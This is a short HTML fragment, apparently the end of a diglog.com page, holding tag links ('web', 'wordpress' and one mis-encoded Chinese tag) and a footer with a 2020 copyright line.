href="/tag/è‰ºæœ¯/">#è‰ºæœ¯</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/web/">#web</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/wordpress/">#wordpress</a></button></div></div></div><div id="my_footer"><div class=""><a href="/tags/">tags</a> <a href="/users/">users</a></div>&copy; 2020 diglog.com </div></div></body></html>